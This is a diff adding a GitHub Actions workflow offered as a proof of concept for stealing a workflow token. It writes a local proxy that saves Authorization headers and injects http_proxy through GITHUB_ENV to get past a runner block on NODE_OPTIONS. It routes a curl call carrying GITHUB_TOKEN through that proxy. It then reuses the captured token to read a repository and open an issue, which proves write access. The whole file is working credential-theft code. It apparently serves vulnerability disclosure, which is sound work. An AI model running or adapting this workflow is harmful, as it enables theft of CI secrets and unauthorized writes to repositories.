@@ -1,0 +1,96 @@
+name: Token Capture and Use PoC (DEFINITIVE)
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  issues: write
+
+jobs:
+  token-capture-use:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Setup MITM proxy and inject via GITHUB_ENV
+        run: |
+          # Proxy that captures AND SAVES the full token
+          cat > /tmp/proxy.py << 'PYEOF'
+          import http.server, socketserver
+          class Handler(http.server.BaseHTTPRequestHandler):
+              def do_GET(self):
+                  auth = self.headers.get('Authorization', '')
+                  with open('/tmp/stolen_token.txt', 'w') as f:
+                      f.write(auth)
+                  self.send_response(502)
+                  self.end_headers()
+                  self.wfile.write(b"captured")
+              do_POST = do_GET
+              def log_message(self, *a): pass
+          with socketserver.TCPServer(("127.0.0.1", 18080), Handler) as s:
+              s.handle_request()
+          PYEOF
+          python3 /tmp/proxy.py &
+          sleep 1
+          
+          # INJECT: http_proxy NOT blocked by runner (only NODE_OPTIONS is)
+          echo "http_proxy=http://127.0.0.1:18080" >> $GITHUB_ENV
+
+      - name: Victim step - token goes through proxy
+        run: |
+          # This curl sends GITHUB_TOKEN through the injected proxy
+          curl --max-time 5 -sS \
+            -H "Authorization: token $GITHUB_TOKEN" \
+            "http://api.github.com/repos/toofikz/public-test-repo" 2>&1 || true
+          
+          echo "=== Captured token ==="
+          if [ -f /tmp/stolen_token.txt ]; then
+            STOLEN=$(cat /tmp/stolen_token.txt)
+            echo "Captured auth header length: ${#STOLEN}"
+            echo "Prefix: ${STOLEN:0:15}..."
+            # Save for next step
+            echo "$STOLEN" > /tmp/stolen_for_use.txt
+          fi
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: PROOF - use captured token (unset proxy first)
+        run: |
+          # Unset proxy so this step makes DIRECT API calls
+          unset http_proxy https_proxy
+          
+          if [ ! -f /tmp/stolen_for_use.txt ]; then
+            echo "No captured token"
+            exit 0
+          fi
+          
+          STOLEN_AUTH=$(cat /tmp/stolen_for_use.txt)
+          # Extract just the token value
+          STOLEN_TOKEN=$(echo "$STOLEN_AUTH" | sed 's/token //')
+          
+          echo "=== USING CAPTURED TOKEN ==="
+          echo "Making authenticated API call with the CAPTURED token..."
+          
+          # Use the captured token to read repo data
+          RESULT=$(curl -sS -H "Authorization: token $STOLEN_TOKEN" \
+            "https://api.github.com/repos/toofikz/public-test-repo" 2>&1)
+          
+          REPO_NAME=$(echo "$RESULT" | python3 -c "import json,sys; print(json.loads(sys.stdin.read()).get('full_name','FAILED'))" 2>/dev/null)
+          PERMISSIONS=$(echo "$RESULT" | python3 -c "import json,sys; print(json.loads(sys.stdin.read()).get('permissions',{}))" 2>/dev/null)
+          
+          echo "API call result: repo=$REPO_NAME"
+          echo "Permissions: $PERMISSIONS"
+          
+          if [ "$REPO_NAME" != "FAILED" ]; then
+            echo ""
+            echo "CRITICAL: Captured GITHUB_TOKEN is VALID and was USED successfully!"
+            echo "The token captured via http_proxy MITM grants authenticated access."
+            
+            # Also try to create an issue (proves write access)
+            ISSUE_RESULT=$(curl -sS -X POST \
+              -H "Authorization: token $STOLEN_TOKEN" \
+              -H "Accept: application/vnd.github+json" \
+              "https://api.github.com/repos/toofikz/public-test-repo/issues" \
+              -d '{"title":"[PoC] Token captured via MITM - proving write access","body":"This issue was created using a GITHUB_TOKEN captured via http_proxy MITM injection through GITHUB_ENV newline. The token was injected via issue title, intercepted by a proxy in the same workflow, and used here to prove write access.","labels":[]}' 2>&1)
+            
+            ISSUE_NUM=$(echo "$ISSUE_RESULT" | python3 -c "import json,sys; print(json.loads(sys.stdin.read()).get('number','FAILED'))" 2>/dev/null)
+            echo "Created issue #$ISSUE_NUM with captured token (proves WRITE access)"
+          fi
